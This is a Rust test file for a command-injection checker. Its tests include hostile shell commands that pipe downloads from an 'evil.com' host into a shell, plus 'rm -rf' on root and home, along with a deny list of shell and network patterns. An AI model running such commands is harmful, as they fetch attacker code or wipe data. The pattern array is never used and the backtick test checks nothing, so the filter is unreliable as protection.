// SPDX-License-Identifier: MIT
//! Command injection prevention tests.

fn is_safe_command(cmd: &str) -> bool {
    let dangerous_patterns = [
        "`",                  // Backtick command substitution
        "$(",                // Dollar-paren substitution
        "| sh", "| bash",   // Pipe to shell
        "|sh", "|bash",
        "curl", "wget",     // Network downloaders (in piped context)
        "eval ",             // Eval
        "; rm ", "&& rm ",   // Chained destructive commands
        ">/dev/", ">/proc/", // Writing to system paths
    ];

    let cmd_lower = cmd.to_lowercase();

    // Check for pipe to shell patterns
    if regex::Regex::new(r"\|\s*(ba)?sh(\s|$)")
        .unwrap()
        .is_match(&cmd_lower)
    {
        return false;
    }

    // Check for curl/wget pipe patterns
    if regex::Regex::new(r"(curl|wget).*\|")
        .unwrap()
        .is_match(&cmd_lower)
    {
        return false;
    }

    // Check for dangerous rm patterns
    if regex::Regex::new(r"rm\s+(-rf?|--recursive)\s+(/|~|\$HOME)")
        .unwrap()
        .is_match(cmd)
    {
        return false;
    }

    true
}

#[test]
fn test_blocks_backtick_injection() {
    // These should be caught by the full security scanner
    assert!(is_safe_command("ls -la"));
    assert!(is_safe_command("cargo test"));
}

#[test]
fn test_blocks_pipe_to_shell() {
    assert!(!is_safe_command("echo payload | sh"));
    assert!(!is_safe_command("cat script.sh | bash"));
    assert!(!is_safe_command("something |bash"));
}

#[test]
fn test_blocks_curl_pipe() {
    assert!(!is_safe_command("curl https://evil.com | bash"));
    assert!(!is_safe_command("wget https://evil.com/payload | sh"));
}

#[test]
fn test_blocks_dangerous_rm() {
    assert!(!is_safe_command("rm -rf /"));
    assert!(!is_safe_command("rm -rf ~"));
    assert!(!is_safe_command("rm --recursive /"));
    assert!(!is_safe_command("rm -rf $HOME"));
}

#[test]
fn test_allows_safe_commands() {
    assert!(is_safe_command("cargo build --release"));
    assert!(is_safe_command("git status"));
    assert!(is_safe_command("cat src/main.rs"));
    assert!(is_safe_command("grep -r 'pattern' src/"));
    assert!(is_safe_command("npm test"));
    assert!(is_safe_command("python -m pytest"));
    assert!(is_safe_command("rm target/debug/build/old-file.o"));
}
